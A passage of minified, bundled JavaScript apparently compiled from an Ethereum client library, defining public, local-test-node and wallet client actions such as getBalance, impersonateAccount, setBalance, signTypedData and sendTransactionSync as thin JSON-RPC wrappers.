Date,...w}=o,y=(0,e.parseSiweMessage)(l);if(!y.address||!(0,n.validateSiweMessage)({address:a,domain:c,message:y,nonce:f,scheme:h,time:b}))return!1;const A=(0,t.hashMessage)(l);return(0,r.verifyHash)(s,{address:y.address,hash:A,signature:m,...w})}return l4}var h4={},Aee;function BM(){if(Aee)return h4;Aee=1,Object.defineProperty(h4,"__esModule",{value:!0}),h4.sendRawTransactionSync=r;const t=ga(),e=JA(),n=kM();async function r(i,{serializedTransaction:s,throwOnReceiptRevert:o,timeout:a}){const c=await i.request({method:"eth_sendRawTransactionSync",params:a?[s,(0,n.numberToHex)(a)]:[s]},{retryCount:0}),f=(i.chain?.formatters?.transactionReceipt?.format||e.formatTransactionReceipt)(c);if(f.status==="reverted"&&o)throw new t.TransactionReceiptRevertedError({receipt:f});return f}return h4}var Cee;function Ide(){if(Cee)return WC;Cee=1,Object.defineProperty(WC,"__esModule",{value:!0}),WC.publicActions=Et;const t=KFe(),e=QFe(),n=JFe(),r=XFe(),i=Mle(),s=ZA(),o=Ule(),a=e$e(),c=Uj(),l=Lle(),f=Fle(),h=Sle(),m=vle(),b=Jj(),w=wle(),y=Qj(),E=t$e(),A=n$e(),R=ly(),S=YA(),v=r$e(),k=d0(),O=$le(),_=eM(),I=s$e(),T=a$e(),B=J8(),U=c$e(),M=Gj(),N=Xj(),q=C$e(),P=S$e(),C=DM(),j=T$e(),z=V8(),$=Ede(),H=x$e(),L=ld(),V=_de(),G=N$e(),Z=Rle(),J=X8(),ne=uR(),re=D$e(),le=B$e(),oe=xde(),ue=Tde(),be=j$e(),Me=Nle(),Te=M$e(),Oe=U$e(),Ke=$$e(),it=zA(),at=uM(),At=BM();function Et(ze){return{call:Re=>(0,s.call)(ze,Re),createAccessList:Re=>(0,o.createAccessList)(ze,Re),createBlockFilter:()=>(0,a.createBlockFilter)(ze),createContractEventFilter:Re=>(0,c.createContractEventFilter)(ze,Re),createEventFilter:Re=>(0,l.createEventFilter)(ze,Re),createPendingTransactionFilter:()=>(0,f.createPendingTransactionFilter)(ze),estimateContractGas:Re=>(0,h.estimateContractGas)(ze,Re),estimateGas:Re=>(0,b.estimateGas)(ze,Re),getBalance:Re=>(0,E.getBalance)(ze,Re),getBlobBaseFee:()=>(0,A.getBlobBaseFee)(ze),getBlock:Re=>(0,R.getBlock)(ze,Re),getBlockNumber:Re=>(0,S.getBlockNumber)(ze,Re),getBlockTransactionCount:Re=>(0,v.getBlockTransactionCount)(ze,Re),getBytecode:Re=>(0,O.getCode)(ze,Re),getChainId:()=>(0,k.getChainId)(ze),getCode:Re=>(0,O.getCode)(ze,Re),getContractEvents:Re=>(0,_.getContractEvents)(ze,Re),getEip712Domain:Re=>(0,I.getEip712Domain)(ze,Re),getEnsAddress:Re=>(0,t.getEnsAddress)(ze,Re),getEnsAvatar:Re=>(0,e.getEnsAvatar)(ze,Re),getEnsName:Re=>(0,n.getEnsName)(ze,Re),getEnsResolver:Re=>(0,r.getEnsResolver)(ze,Re),getEnsText:Re=>(0,i.getEnsText)(ze,Re),getFeeHistory:Re=>(0,T.getFeeHistory)(ze,Re),estimateFeesPerGas:Re=>(0,m.estimateFeesPerGas)(ze,Re),getFilterChanges:Re=>(0,B.getFilterChanges)(ze,Re),getFilterLogs:Re=>(0,U.getFilterLogs)(ze,Re),getGasPrice:()=>(0,M.getGasPrice)(ze),getLogs:Re=>(0,N.getLogs)(ze,Re),getProof:Re=>(0,q.getProof)(ze,Re),estimateMaxPriorityFeePerGas:Re=>(0,w.estimateMaxPriorityFeePerGas)(ze,Re),fillTransaction:Re=>(0,y.fillTransaction)(ze,Re),getStorageAt:Re=>(0,P.getStorageAt)(ze,Re),getTransaction:Re=>(0,C.getTransaction)(ze,Re),getTransactionConfirmations:Re=>(0,j.getTransactionConfirmations)(ze,Re),getTransactionCount:Re=>(0,z.getTransactionCount)(ze,Re),getTransactionReceipt:Re=>(0,$.getTransactionReceipt)(ze,Re),multicall:Re=>(0,H.multicall)(ze,Re),prepareTransactionRequest:Re=>(0,it.prepareTransactionRequest)(ze,Re),readContract:Re=>(0,L.readContract)(ze,Re),sendRawTransaction:Re=>(0,at.sendRawTransaction)(ze,Re),sendRawTransactionSync:Re=>(0,At.sendRawTransactionSync)(ze,Re),simulate:Re=>(0,V.simulateBlocks)(ze,Re),simulateBlocks:Re=>(0,V.simulateBlocks)(ze,Re),simulateCalls:Re=>(0,G.simulateCalls)(ze,Re),simulateContract:Re=>(0,Z.simulateContract)(ze,Re),verifyHash:Re=>(0,ne.verifyHash)(ze,Re),verifyMessage:Re=>(0,re.verifyMessage)(ze,Re),verifySiweMessage:Re=>(0,Ke.verifySiweMessage)(ze,Re),verifyTypedData:Re=>(0,le.verifyTypedData)(ze,Re),uninstallFilter:Re=>(0,J.uninstallFilter)(ze,Re),waitForTransactionReceipt:Re=>(0,oe.waitForTransactionReceipt)(ze,Re),watchBlocks:Re=>(0,be.watchBlocks)(ze,Re),watchBlockNumber:Re=>(0,ue.watchBlockNumber)(ze,Re),watchContractEvent:Re=>(0,Me.watchContractEvent)(ze,Re),watchEvent:Re=>(0,Te.watchEvent)(ze,Re),watchPendingTransactions:Re=>(0,Oe.watchPendingTransactions)(ze,Re)}}return WC}var See;function H$e(){if(See)return VC;See=1,Object.defineProperty(VC,"__esModule",{value:!0}),VC.createPublicClient=n;const t=nR(),e=Ide();function n(r){const{key:i="public",name:s="Public Client"}=r;return(0,t.createClient)({...r,key:i,name:s,type:"publicClient"}).extend(e.publicActions)}return VC}var p4={},m4={},g4={},Tee;function z$e(){if(Tee)return g4;Tee=1,Object.defineProperty(g4,"__esModule",{value:!0}),g4.dropTransaction=t;async function t(e,{hash:n}){await e.request({method:`${e.mode}_dropTransaction`,params:[n]})}return g4}var y4={},xee;function q$e(){if(xee)return y4;xee=1,Object.defineProperty(y4,"__esModule",{value:!0}),y4.dumpState=t;async function t(e){return e.request({method:`${e.mode}_dumpState`})}return y4}var b4={},Iee;function V$e(){if(Iee)return b4;Iee=1,Object.defineProperty(b4,"__esModule",{value:!0}),b4.getAutomine=t;async function t(e){return e.mode==="ganache"?await e.request({method:"eth_mining"}):await e.request({method:`${e.mode}_getAutomine`})}return b4}var w4={},Ree;function W$e(){if(Ree)return w4;Ree=1,Object.defineProperty(w4,"__esModule",{value:!0}),w4.getTxpoolContent=t;async function t(e){return await e.request({method:"txpool_content"})}return w4}var v4={},Pee;function G$e(){if(Pee)return v4;Pee=1,Object.defineProperty(v4,"__esModule",{value:!0}),v4.getTxpoolStatus=e;const t=ci();async function e(n){const{pending:r,queued:i}=await n.request({method:"txpool_status"});return{pending:(0,t.hexToNumber)(r),queued:(0,t.hexToNumber)(i)}}return v4}var E4={},Nee;function K$e(){if(Nee)return E4;Nee=1,Object.defineProperty(E4,"__esModule",{value:!0}),E4.impersonateAccount=t;async function t(e,{address:n}){await e.request({method:`${e.mode}_impersonateAccount`,params:[n]})}return E4}var _4={},Oee;function Z$e(){if(Oee)return _4;Oee=1,Object.defineProperty(_4,"__esModule",{value:!0}),_4.increaseTime=e;const t=lt();async function e(n,{seconds:r}){return await n.request({method:"evm_increaseTime",params:[(0,t.numberToHex)(r)]})}return _4}var A4={},kee;function Y$e(){if(kee)return A4;kee=1,Object.defineProperty(A4,"__esModule",{value:!0}),A4.inspectTxpool=t;async function t(e){return await e.request({method:"txpool_inspect"})}return A4}var C4={},Dee;function Q$e(){if(Dee)return C4;Dee=1,Object.defineProperty(C4,"__esModule",{value:!0}),C4.loadState=t;async function t(e,{state:n}){await e.request({method:`${e.mode}_loadState`,params:[n]})}return C4}var S4={},Bee;function J$e(){if(Bee)return S4;Bee=1,Object.defineProperty(S4,"__esModule",{value:!0}),S4.mine=e;const t=lt();async function e(n,{blocks:r,interval:i}){n.mode==="ganache"?await n.request({method:"evm_mine",params:[{blocks:(0,t.numberToHex)(r)}]}):await n.request({method:`${n.mode}_mine`,params:[(0,t.numberToHex)(r),(0,t.numberToHex)(i||0)]})}return S4}var T4={},jee;function X$e(){if(jee)return T4;jee=1,Object.defineProperty(T4,"__esModule",{value:!0}),T4.removeBlockTimestampInterval=t;async function t(e){await e.request({method:`${e.mode}_removeBlockTimestampInterval`})}return T4}var x4={},Mee;function eHe(){if(Mee)return x4;Mee=1,Object.defineProperty(x4,"__esModule",{value:!0}),x4.reset=t;async function t(e,{blockNumber:n,jsonRpcUrl:r}={}){await e.request({method:`${e.mode}_reset`,params:[{forking:{blockNumber:Number(n),jsonRpcUrl:r}}]})}return x4}var I4={},Uee;function tHe(){if(Uee)return I4;Uee=1,Object.defineProperty(I4,"__esModule",{value:!0}),I4.revert=t;async function t(e,{id:n}){await e.request({method:"evm_revert",params:[n]})}return I4}var R4={},Lee;function nHe(){if(Lee)return R4;Lee=1,Object.defineProperty(R4,"__esModule",{value:!0}),R4.sendUnsignedTransaction=n;const t=l0(),e=Yu();async function n(r,i){const{accessList:s,data:o,from:a,gas:c,gasPrice:l,maxFeePerGas:f,maxPriorityFeePerGas:h,nonce:m,to:b,value:w,...y}=i,E=r.chain?.formatters?.transactionRequest?.format,R=(E||e.formatTransactionRequest)({...(0,t.extract)(y,{format:E}),accessList:s,data:o,from:a,gas:c,gasPrice:l,maxFeePerGas:f,maxPriorityFeePerGas:h,nonce:m,to:b,value:w},"sendUnsignedTransaction");return await r.request({method:"eth_sendUnsignedTransaction",params:[R]})}return R4}var P4={},Fee;function rHe(){if(Fee)return P4;Fee=1,Object.defineProperty(P4,"__esModule",{value:!0}),P4.setAutomine=t;async function t(e,n){e.mode==="ganache"?n?await e.request({method:"miner_start"}):await e.request({method:"miner_stop"}):await e.request({method:"evm_setAutomine",params:[n]})}return P4}var N4={},$ee;function iHe(){if($ee)return N4;$ee=1,Object.defineProperty(N4,"__esModule",{value:!0}),N4.setBalance=e;const t=lt();async function e(n,{address:r,value:i}){n.mode==="ganache"?await n.request({method:"evm_setAccountBalance",params:[r,(0,t.numberToHex)(i)]}):await n.request({method:`${n.mode}_setBalance`,params:[r,(0,t.numberToHex)(i)]})}return N4}var O4={},Hee;function sHe(){if(Hee)return O4;Hee=1,Object.defineProperty(O4,"__esModule",{value:!0}),O4.setBlockGasLimit=e;const t=lt();async function e(n,{gasLimit:r}){await n.request({method:"evm_setBlockGasLimit",params:[(0,t.numberToHex)(r)]})}return O4}var k4={},zee;function oHe(){if(zee)return k4;zee=1,Object.defineProperty(k4,"__esModule",{value:!0}),k4.setBlockTimestampInterval=t;async function t(e,{interval:n}){const r=e.mode==="hardhat"?n*1e3:n;await e.request({method:`${e.mode}_setBlockTimestampInterval`,params:[r]})}return k4}var D4={},qee;function aHe(){if(qee)return D4;qee=1,Object.defineProperty(D4,"__esModule",{value:!0}),D4.setCode=t;async function t(e,{address:n,bytecode:r}){e.mode==="ganache"?await e.request({method:"evm_setAccountCode",params:[n,r]}):await e.request({method:`${e.mode}_setCode`,params:[n,r]})}return D4}var B4={},Vee;function cHe(){if(Vee)return B4;Vee=1,Object.defineProperty(B4,"__esModule",{value:!0}),B4.setCoinbase=t;async function t(e,{address:n}){await e.request({method:`${e.mode}_setCoinbase`,params:[n]})}return B4}var j4={},Wee;function uHe(){if(Wee)return j4;Wee=1,Object.defineProperty(j4,"__esModule",{value:!0}),j4.setIntervalMining=t;async function t(e,{interval:n}){const r=e.mode==="hardhat"?n*1e3:n;await e.request({method:"evm_setIntervalMining",params:[r]})}return j4}var M4={},Gee;function lHe(){if(Gee)return M4;Gee=1,Object.defineProperty(M4,"__esModule",{value:!0}),M4.setLoggingEnabled=t;async function t(e,n){await e.request({method:`${e.mode}_setLoggingEnabled`,params:[n]})}return M4}var U4={},Kee;function dHe(){if(Kee)return U4;Kee=1,Object.defineProperty(U4,"__esModule",{value:!0}),U4.setMinGasPrice=e;const t=lt();async function e(n,{gasPrice:r}){await n.request({method:`${n.mode}_setMinGasPrice`,params:[(0,t.numberToHex)(r)]})}return U4}var L4={},Zee;function fHe(){if(Zee)return L4;Zee=1,Object.defineProperty(L4,"__esModule",{value:!0}),L4.setNextBlockBaseFeePerGas=e;const t=lt();async function e(n,{baseFeePerGas:r}){await n.request({method:`${n.mode}_setNextBlockBaseFeePerGas`,params:[(0,t.numberToHex)(r)]})}return L4}var F4={},Yee;function hHe(){if(Yee)return F4;Yee=1,Object.defineProperty(F4,"__esModule",{value:!0}),F4.setNextBlockTimestamp=e;const t=lt();async function e(n,{timestamp:r}){await n.request({method:"evm_setNextBlockTimestamp",params:[(0,t.numberToHex)(r)]})}return F4}var $4={},Qee;function pHe(){if(Qee)return $4;Qee=1,Object.defineProperty($4,"__esModule",{value:!0}),$4.setNonce=e;const t=lt();async function e(n,{address:r,nonce:i}){await n.request({method:`${n.mode}_setNonce`,params:[r,(0,t.numberToHex)(i)]})}return $4}var H4={},Jee;function mHe(){if(Jee)return H4;Jee=1,Object.defineProperty(H4,"__esModule",{value:!0}),H4.setRpcUrl=t;async function t(e,n){await e.request({method:`${e.mode}_setRpcUrl`,params:[n]})}return H4}var z4={},Xee;function gHe(){if(Xee)return z4;Xee=1,Object.defineProperty(z4,"__esModule",{value:!0}),z4.setStorageAt=e;const t=lt();async function e(n,{address:r,index:i,value:s}){await n.request({method:`${n.mode}_setStorageAt`,params:[r,typeof i=="number"?(0,t.numberToHex)(i):i,s]})}return z4}var q4={},ete;function yHe(){if(ete)return q4;ete=1,Object.defineProperty(q4,"__esModule",{value:!0}),q4.snapshot=t;async function t(e){return await e.request({method:"evm_snapshot"})}return q4}var V4={},tte;function bHe(){if(tte)return V4;tte=1,Object.defineProperty(V4,"__esModule",{value:!0}),V4.stopImpersonatingAccount=t;async function t(e,{address:n}){await e.request({method:`${e.mode}_stopImpersonatingAccount`,params:[n]})}return V4}var nte;function Rde(){if(nte)return m4;nte=1,Object.defineProperty(m4,"__esModule",{value:!0}),m4.testActions=q;const t=z$e(),e=q$e(),n=V$e(),r=W$e(),i=G$e(),s=K$e(),o=Z$e(),a=Y$e(),c=Q$e(),l=J$e(),f=X$e(),h=eHe(),m=tHe(),b=nHe(),w=rHe(),y=iHe(),E=sHe(),A=oHe(),R=aHe(),S=cHe(),v=uHe(),k=lHe(),O=dHe(),_=fHe(),I=hHe(),T=pHe(),B=mHe(),U=gHe(),M=yHe(),N=bHe();function q({mode:P}){return C=>{const j=C.extend(()=>({mode:P}));return{dropTransaction:z=>(0,t.dropTransaction)(j,z),dumpState:()=>(0,e.dumpState)(j),getAutomine:()=>(0,n.getAutomine)(j),getTxpoolContent:()=>(0,r.getTxpoolContent)(j),getTxpoolStatus:()=>(0,i.getTxpoolStatus)(j),impersonateAccount:z=>(0,s.impersonateAccount)(j,z),increaseTime:z=>(0,o.increaseTime)(j,z),inspectTxpool:()=>(0,a.inspectTxpool)(j),loadState:z=>(0,c.loadState)(j,z),mine:z=>(0,l.mine)(j,z),removeBlockTimestampInterval:()=>(0,f.removeBlockTimestampInterval)(j),reset:z=>(0,h.reset)(j,z),revert:z=>(0,m.revert)(j,z),sendUnsignedTransaction:z=>(0,b.sendUnsignedTransaction)(j,z),setAutomine:z=>(0,w.setAutomine)(j,z),setBalance:z=>(0,y.setBalance)(j,z),setBlockGasLimit:z=>(0,E.setBlockGasLimit)(j,z),setBlockTimestampInterval:z=>(0,A.setBlockTimestampInterval)(j,z),setCode:z=>(0,R.setCode)(j,z),setCoinbase:z=>(0,S.setCoinbase)(j,z),setIntervalMining:z=>(0,v.setIntervalMining)(j,z),setLoggingEnabled:z=>(0,k.setLoggingEnabled)(j,z),setMinGasPrice:z=>(0,O.setMinGasPrice)(j,z),setNextBlockBaseFeePerGas:z=>(0,_.setNextBlockBaseFeePerGas)(j,z),setNextBlockTimestamp:z=>(0,I.setNextBlockTimestamp)(j,z),setNonce:z=>(0,T.setNonce)(j,z),setRpcUrl:z=>(0,B.setRpcUrl)(j,z),setStorageAt:z=>(0,U.setStorageAt)(j,z),snapshot:()=>(0,M.snapshot)(j),stopImpersonatingAccount:z=>(0,N.stopImpersonatingAccount)(j,z)}}}return m4}var rte;function wHe(){if(rte)return p4;rte=1,Object.defineProperty(p4,"__esModule",{value:!0}),p4.createTestClient=n;const t=nR(),e=Rde();function n(r){const{key:i="test",name:s="Test Client",mode:o}=r;return(0,t.createClient)({...r,key:i,name:s,type:"testClient"}).extend(c=>({mode:o,...(0,e.testActions)({mode:o})(c)}))}return p4}var W4={},G4={},K4={},ite;function vHe(){if(ite)return K4;ite=1,Object.defineProperty(K4,"__esModule",{value:!0}),K4.addChain=e;const t=lt();async function e(n,{chain:r}){const{id:i,name:s,nativeCurrency:o,rpcUrls:a,blockExplorers:c}=r;await n.request({method:"wallet_addEthereumChain",params:[{chainId:(0,t.numberToHex)(i),chainName:s,nativeCurrency:o,rpcUrls:a.default.http,blockExplorerUrls:c?Object.values(c).map(({url:l})=>l):void 0}]},{dedupe:!0,retryCount:0})}return K4}var Z4={},ste;function EHe(){if(ste)return Z4;ste=1,Object.defineProperty(Z4,"__esModule",{value:!0}),Z4.deployContract=n;const t=KA(),e=eR();function n(r,i){const{abi:s,args:o,bytecode:a,...c}=i,l=(0,t.encodeDeployData)({abi:s,args:o,bytecode:a});return(0,e.sendTransaction)(r,{...c,...c.authorizationList?{to:null}:{},data:l})}return Z4}var Y4={},ote;function _He(){if(ote)return Y4;ote=1,Object.defineProperty(Y4,"__esModule",{value:!0}),Y4.getAddresses=e;const t=nc();async function e(n){return n.account?.type==="local"?[n.account.address]:(await n.request({method:"eth_accounts"},{dedupe:!0})).map(i=>(0,t.checksumAddress)(i))}return Y4}var Q4={},ate;function AHe(){if(ate)return Q4;ate=1,Object.defineProperty(Q4,"__esModule",{value:!0}),Q4.getCapabilities=n;const t=Qr(),e=lt();async function n(r,i={}){const{account:s=r.account,chainId:o}=i,a=s?(0,t.parseAccount)(s):void 0,c=o?[a?.address,[(0,e.numberToHex)(o)]]:[a?.address],l=await r.request({method:"wallet_getCapabilities",params:c}),f={};for(const[h,m]of Object.entries(l)){f[Number(h)]={};for(let[b,w]of Object.entries(m))b==="addSubAccount"&&(b="unstable_addSubAccount"),f[Number(h)][b]=w}return typeof o=="number"?f[o]:f}return Q4}var J4={},cte;function CHe(){if(cte)return J4;cte=1,Object.defineProperty(J4,"__esModule",{value:!0}),J4.getPermissions=t;async function t(e){return await e.request({method:"wallet_getPermissions"},{dedupe:!0})}return J4}var X4={},ute;function Pde(){if(ute)return X4;ute=1,Object.defineProperty(X4,"__esModule",{value:!0}),X4.prepareAuthorization=o;const t=Qr(),e=p0(),n=Ju(),r=Pn(),i=d0(),s=V8();async function o(a,c){const{account:l=a.account,chainId:f,nonce:h}=c;if(!l)throw new e.AccountNotFoundError({docsPath:"/docs/eip7702/prepareAuthorization"});const m=(0,t.parseAccount)(l),b=(()=>{if(c.executor)return c.executor==="self"?c.executor:(0,t.parseAccount)(c.executor)})(),w={address:c.contractAddress??c.address,chainId:f,nonce:h};return typeof w.chainId>"u"&&(w.chainId=a.chain?.id??await(0,r.getAction)(a,i.getChainId,"getChainId")({})),typeof w.nonce>"u"&&(w.nonce=await(0,r.getAction)(a,s.getTransactionCount,"getTransactionCount")({address:m.address,blockTag:"pending"}),(b==="self"||b?.address&&(0,n.isAddressEqual)(b.address,m.address))&&(w.nonce+=1)),w}return X4}var eT={},lte;function SHe(){if(lte)return eT;lte=1,Object.defineProperty(eT,"__esModule",{value:!0}),eT.requestAddresses=e;const t=nc();async function e(n){return(await n.request({method:"eth_requestAccounts"},{dedupe:!0,retryCount:0})).map(i=>(0,t.getAddress)(i))}return eT}var tT={},dte;function THe(){if(dte)return tT;dte=1,Object.defineProperty(tT,"__esModule",{value:!0}),tT.requestPermissions=t;async function t(e,n){return e.request({method:"wallet_requestPermissions",params:[n]},{retryCount:0})}return tT}var nT={},fte;function xHe(){if(fte)return nT;fte=1,Object.defineProperty(nT,"__esModule",{value:!0}),nT.sendCallsSync=n;const t=dM(),e=fM();async function n(r,i){const{chain:s=r.chain}=i,o=i.timeout??Math.max((s?.blockTime??0)*3,5e3),a=await(0,t.sendCalls)(r,i);return await(0,e.waitForCallsStatus)(r,{...i,id:a.id,timeout:o})}return nT}var rT={},hte;function Nde(){if(hte)return rT;hte=1,Object.defineProperty(rT,"__esModule",{value:!0}),rT.sendTransactionSync=A;const t=Qr(),e=p0(),n=Kt(),r=ga(),i=UA(),s=QA(),o=HA(),a=l0(),c=Yu(),l=Pn(),f=iy(),h=Qu(),m=d0(),b=xde(),w=zA(),y=BM(),E=new f.LruMap(128);async function A(R,S){const{account:v=R.account,chain:k=R.chain,accessList:O,authorizationList:_,blobs:I,data:T,gas:B,gasPrice:U,maxFeePerBlobGas:M,maxFeePerGas:N,maxPriorityFeePerGas:q,nonce:P,pollingInterval:C,throwOnReceiptRevert:j,type:z,value:$,...H}=S,L=S.timeout??Math.max((k?.blockTime??0)*3,5e3);if(typeof v>"u")throw new e.AccountNotFoundError({docsPath:"/docs/actions/wallet/sendTransactionSync"});const V=v?(0,t.parseAccount)(v):null;try{(0,h.assertRequest)(S);const G=await(async()=>{if(S.to)return S.to;if(S.to!==null&&_&&_.length>0)return await(0,i.recoverAuthorizationAddress)({authorization:_[0]}).catch(()=>{throw new n.BaseError("`to` is required. Could not infer from `authorizationList`.")})})();if(V?.type==="json-rpc"||V===null){let Z;k!==null&&(Z=await(0,l.getAction)(R,m.getChainId,"getChainId")({}),(0,s.assertCurrentChain)({currentChainId:Z,chain:k}));const J=R.chain?.formatters?.transactionRequest?.format,re=(J||c.formatTransactionRequest)({...(0,a.extract)(H,{format:J}),accessList:O,account:V,authorizationList:_,blobs:I,chainId:Z,data:T,gas:B,gasPrice:U,maxFeePerBlobGas:M,maxFeePerGas:N,maxPriorityFeePerGas:q,nonce:P,to:G,type:z,value:$},"sendTransaction"),le=E.get(R.uid),oe=le?"wallet_sendTransaction":"eth_sendTransaction",ue=await(async()=>{try{return await R.request({method:oe,params:[re]},{retryCount:0})}catch(Me){if(le===!1)throw Me;const Te=Me;if(Te.name==="InvalidInputRpcError"||Te.name==="InvalidParamsRpcError"||Te.name==="MethodNotFoundRpcError"||Te.name==="MethodNotSupportedRpcError")return await R.request({method:"wallet_sendTransaction",params:[re]},{retryCount:0}).then(Oe=>(E.set(R.uid,!0),Oe)).catch(Oe=>{const Ke=Oe;throw Ke.name==="MethodNotFoundRpcError"||Ke.name==="MethodNotSupportedRpcError"?(E.set(R.uid,!1),Te):Ke});throw Te}})(),be=await(0,l.getAction)(R,b.waitForTransactionReceipt,"waitForTransactionReceipt")({checkReplacement:!1,hash:ue,pollingInterval:C,timeout:L});if(j&&be.status==="reverted")throw new r.TransactionReceiptRevertedError({receipt:be});return be}if(V?.type==="local"){const Z=await(0,l.getAction)(R,w.prepareTransactionRequest,"prepareTransactionRequest")({account:V,accessList:O,authorizationList:_,blobs:I,chain:k,data:T,gas:B,gasPrice:U,maxFeePerBlobGas:M,maxFeePerGas:N,maxPriorityFeePerGas:q,nonce:P,nonceManager:V.nonceManager,parameters:[...w.defaultParameters,"sidecars"],type:z,value:$,...H,to:G}),J=k?.serializers?.transaction,ne=await V.signTransaction(Z,{serializer:J});return await(0,l.getAction)(R,y.sendRawTransactionSync,"sendRawTransactionSync")({serializedTransaction:ne,throwOnReceiptRevert:j})}throw V?.type==="smart"?new e.AccountTypeNotSupportedError({metaMessages:["Consider using the `sendUserOperation` Action instead."],docsPath:"/docs/actions/bundler/sendUserOperation",type:"smart"}):new e.AccountTypeNotSupportedError({docsPath:"/docs/actions/wallet/sendTransactionSync",type:V?.type})}catch(G){throw G instanceof e.AccountTypeNotSupportedError?G:(0,o.getTransactionError)(G,{...S,account:V,chain:S.chain||void 0})}}return rT}var iT={},pte;function IHe(){if(pte)return iT;pte=1,Object.defineProperty(iT,"__esModule",{value:!0}),iT.showCallsStatus=t;async function t(e,n){const{id:r}=n;await e.request({method:"wallet_showCallsStatus",params:[r]})}return iT}var sT={},mte;function RHe(){if(mte)return sT;mte=1,Object.defineProperty(sT,"__esModule",{value:!0}),sT.signAuthorization=r;const t=Qr(),e=p0(),n=Pde();async function r(i,s){const{account:o=i.account}=s;if(!o)throw new e.AccountNotFoundError({docsPath:"/docs/eip7702/signAuthorization"});const a=(0,t.parseAccount)(o);if(!a.signAuthorization)throw new e.AccountTypeNotSupportedError({docsPath:"/docs/eip7702/signAuthorization",metaMessages:["The `signAuthorization` Action does not support JSON-RPC Accounts."],type:a.type});const c=await(0,n.prepareAuthorization)(i,s);return a.signAuthorization(c)}return sT}var oT={},gte;function PHe(){if(gte)return oT;gte=1,Object.defineProperty(oT,"__esModule",{value:!0}),oT.signMessage=r;const t=Qr(),e=p0(),n=lt();async function r(i,{account:s=i.account,message:o}){if(!s)throw new e.AccountNotFoundError({docsPath:"/docs/actions/wallet/signMessage"});const a=(0,t.parseAccount)(s);if(a.signMessage)return a.signMessage({message:o});const c=typeof o=="string"?(0,n.stringToHex)(o):o.raw instanceof Uint8Array?(0,n.toHex)(o.raw):o.raw;return i.request({method:"personal_sign",params:[c,a.address]},{retryCount:0})}return oT}var aT={},yte;function NHe(){if(yte)return aT;yte=1,Object.defineProperty(aT,"__esModule",{value:!0}),aT.signTransaction=c;const t=Qr(),e=p0(),n=QA(),r=lt(),i=Yu(),s=Pn(),o=Qu(),a=d0();async function c(l,f){const{account:h=l.account,chain:m=l.chain,...b}=f;if(!h)throw new e.AccountNotFoundError({docsPath:"/docs/actions/wallet/signTransaction"});const w=(0,t.parseAccount)(h);(0,o.assertRequest)({account:w,...f});const y=await(0,s.getAction)(l,a.getChainId,"getChainId")({});m!==null&&(0,n.assertCurrentChain)({currentChainId:y,chain:m});const A=(m?.formatters||l.chain?.formatters)?.transactionRequest?.format||i.formatTransactionRequest;return w.signTransaction?w.signTransaction({...b,chainId:y},{serializer:l.chain?.serializers?.transaction}):await l.request({method:"eth_signTransaction",params:[{...A({...b,account:w},"signTransaction"),chainId:(0,r.numberToHex)(y),from:w.address}]},{retryCount:0})}return aT}var cT={},bte;function OHe(){if(bte)return cT;bte=1,Object.defineProperty(cT,"__esModule",{value:!0}),cT.signTypedData=r;const t=Qr(),e=p0(),n=sR();async function r(i,s){const{account:o=i.account,domain:a,message:c,primaryType:l}=s;if(!o)throw new e.AccountNotFoundError({docsPath:"/docs/actions/wallet/signTypedData"});const f=(0,t.parseAccount)(o),h={EIP712Domain:(0,n.getTypesForEIP712Domain)({domain:a}),...s.types};if((0,n.validateTypedData)({domain:a,message:c,primaryType:l,types:h}),f.signTypedData)return f.signTypedData({domain:a,message:c,primaryType:l,types:h});const m=(0,n.serializeTypedData)({domain:a,message:c,primaryType:l,types:h});return i.request({method:"eth_signTypedData_v4",params:[f.address,m]},{retryCount:0})}return cT}var uT={},wte;function kHe(){if(wte)return uT;wte=1,Object.defineProperty(uT,"__esModule",{value:!0}),uT.switchChain=e;const t=lt();async function e(n,{id:r}){await n.request({method:"wallet_switchEthereumChain",params:[{chainId:(0,t.numberToHex)(r)}]},{retryCount:0})}return uT}var lT={},vte;function DHe(){if(vte)return lT;vte=1,Object.defineProperty(lT,"__esModule",{value:!0}),lT.watchAsset=t;async function t(e,n){return await e.request({method:"wallet_watchAsset",params:n},{retryCount:0})}return lT}var dT={},Ete;function BHe(){if(Ete)return dT;Ete=1,Object.defineProperty(dT,"__esModule",{value:!0}),dT.writeContractSync=n;const t=Nde(),e=lM();async function n(r,i){return e.writeContract.internal(r,t.sendTransactionSync,"sendTransactionSync",i)}return dT}var _te;function Ode(){if(_te)return G4;_te=1,Object.defineProperty(G4,"__esModule",{value:!0}),G4.walletActions=M;const t=Qj(),e=d0(),n=vHe(),r=EHe(),i=_He(),s=kle(),o=AHe(),a=CHe(),c=Pde(),l=zA(),f=SHe(),h=THe(),m=dM(),b=xHe(),w=uM(),y=BM(),E=eR(),A=Nde(),R=IHe(),S=RHe(),v=PHe(),k=NHe(),O=OHe(),_=kHe(),I=fM(),T=DHe(),B=lM(),U=BHe();function M(N){return{addChain:q=>(0,n.addChain)(N,q),deployContract:q=>(0,r.deployContract)(N,q),fillTransaction:q=>(0,t.fillTransaction)(N,q),getAddresses:()=>(0,i.getAddresses)(N),getCallsStatus:q=>(0,s.getCallsStatus)(N,q),getCapabilities:q=>(0,o.getCapabilities)(N,q),getChainId:()=>(0,e.getChainId)(N),getPermissions:()=>(0,a.getPermissions)(N),prepareAuthorization:q=>(0,c.prepareAuthorization)(N,q),prepareTransactionRequest:q=>(0,l.prepareTransactionRequest)(N,q),requestAddresses:()=>(0,f.requestAddresses)(N),requestPermissions:q=>(0,h.requestPermissions)(N,q),sendCalls:q=>(0,m.sendCalls)(N,q),sendCallsSync:q=>(0,b.sendCallsSync)(N,q),sendRawTransaction:q=>(0,w.sendRawTransaction)(N,q),sendRawTransactionSync:q=>(0,y.sendRawTransactionSync)(N,q),sendTransaction:q=>(0,E.sendTransaction)(N,q),sendTransactionSync:q=>(0,A.sendTransactionSync)(N,q),showCallsStatus:q=>(0,R.showCallsStatus)(N,q),signAuthorization:q=>(0,S.signAuthorization)(N,q),signMessage:q=>(0,v.signMessage)(N,q),signTransaction:q=>(0,k.signTransaction)(N,q),signTypedData:q=>(0,O.signTypedData)(N,q),switchChain:q=>(0,_.switchChain)(N,q),waitForCallsStatus:q=>(0,I.waitForCallsStatus)(N,q),watchAsset:q=>(0,T.watchAsset)(N,q),writeContract:q=>(0,B.writeContract)(N,q),writeContractSync:q=>(0,U.writeContractSync)(N,q)}}return G4}var Ate;function jHe(){if(Ate)return W4;Ate=1,Object.defineProperty(W4,"__esModule",{value:!0}),W4.createWalletClient=n;const t=nR(),e=Ode();function n(r){const{key:i="wallet",name:s="Wallet 